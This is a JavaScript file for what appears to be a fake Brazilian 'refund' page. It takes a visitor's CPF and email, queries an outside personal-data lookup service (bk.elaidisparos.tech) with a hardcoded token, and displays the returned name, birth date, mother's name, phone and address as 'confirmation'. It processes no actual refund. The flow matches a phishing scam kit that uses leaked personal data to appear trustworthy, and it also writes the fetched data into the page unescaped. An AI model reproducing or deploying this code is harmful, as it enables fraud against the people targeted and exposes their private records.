let userData = null;

document.addEventListener('DOMContentLoaded', () => {
  const refundButton = document.getElementById('refund-button');
  const backButton = document.getElementById('back-to-main');
  const refundForm = document.getElementById('refund-form');
  const confirmButton = document.getElementById('confirm-button');
  const cpfInput = document.getElementById('cpf-input');

  refundButton.addEventListener('click', showFormScreen);
  backButton.addEventListener('click', showMainScreen);
  refundForm.addEventListener('submit', handleFormSubmit);
  confirmButton.addEventListener('click', handleConfirmation);

  cpfInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 11) {
      value = value.slice(0, 11);
    }

    if (value.length > 9) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    } else if (value.length > 6) {
      value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
    } else if (value.length > 3) {
      value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
    }

    e.target.value = value;
  });
});

function showFormScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'block';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'none';
}

function showMainScreen() {
  document.getElementById('main-screen').style.display = 'block';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'none';
}

function showConfirmationScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'block';
  document.getElementById('success-screen').style.display = 'none';
}

function showSuccessScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'block';
}

async function handleFormSubmit(e) {
  e.preventDefault();

  const cpf = document.getElementById('cpf-input').value.replace(/\D/g, '');
  const email = document.getElementById('email-input').value;

  if (!cpf || cpf.length !== 11) {
    alert('Por favor, insira um CPF válido.');
    return;
  }

  if (!email || !email.includes('@')) {
    alert('Por favor, insira um e-mail válido.');
    return;
  }

  const submitButton = document.getElementById('submit-form-button');
  submitButton.disabled = true;
  submitButton.textContent = 'Consultando dados...';

  try {
    const response = await fetch(
      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=5y61eukw00cavxof9866lj`
    );

    if (!response.ok) {
      throw new Error('Erro ao consultar CPF');
    }

    const data = await response.json();

    userData = {
      ...data,
      email: email
    };

    displayConfirmationData(userData);
    showConfirmationScreen();

  } catch (error) {
    console.error('Erro ao consultar CPF:', error);
    alert('Erro ao consultar dados. Por favor, tente novamente.');
  } finally {
    submitButton.disabled = false;
    submitButton.textContent = 'Confirmar dados';
  }
}

function displayConfirmationData(data) {
  const container = document.getElementById('confirmation-data');

  const fields = [
    { label: 'Nome', value: data.nome || 'Não informado' },
    { label: 'CPF', value: formatCPF(data.cpf) || 'Não informado' },
    { label: 'E-mail', value: data.email || 'Não informado' },
    { label: 'Data de Nascimento', value: formatDate(data.nascimento) || 'Não informado' },
    { label: 'Nome da Mãe', value: data.mae || 'Não informado' },
    { label: 'Telefone', value: data.telefone || 'Não informado' },
    { label: 'Endereço', value: formatAddress(data) || 'Não informado' }
  ];

  container.innerHTML = fields.map(field => `
    <div class="confirmation-row">
      <span class="confirmation-label">${field.label}</span>
      <span class="confirmation-value">${field.value}</span>
    </div>
  `).join('');
}

function formatCPF(cpf) {
  if (!cpf) return '';
  const cleaned = cpf.replace(/\D/g, '');
  return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function formatDate(date) {
  if (!date) return '';
  if (date.includes('/')) return date;

  const cleaned = date.replace(/\D/g, '');
  if (cleaned.length === 8) {
    return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}/${cleaned.substring(4, 8)}`;
  }
  return date;
}

function formatAddress(data) {
  const parts = [];

  if (data.logradouro) parts.push(data.logradouro);
  if (data.numero) parts.push(`nº ${data.numero}`);
  if (data.bairro) parts.push(data.bairro);
  if (data.cidade) parts.push(data.cidade);
  if (data.estado) parts.push(data.estado);
  if (data.cep) parts.push(`CEP: ${data.cep}`);

  return parts.join(', ') || '';
}

function handleConfirmation() {
  showSuccessScreen();
}
